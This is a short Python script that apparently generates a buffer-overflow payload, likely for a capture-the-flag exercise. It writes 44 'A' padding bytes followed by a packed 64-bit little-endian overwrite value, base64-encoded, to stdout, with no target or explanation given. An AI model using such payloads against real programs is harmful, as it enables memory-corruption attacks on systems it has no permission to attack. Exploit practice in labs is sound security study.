
import sys
import struct
import base64

buf = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
buf += struct.pack('<Q', 17245124828894850773)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
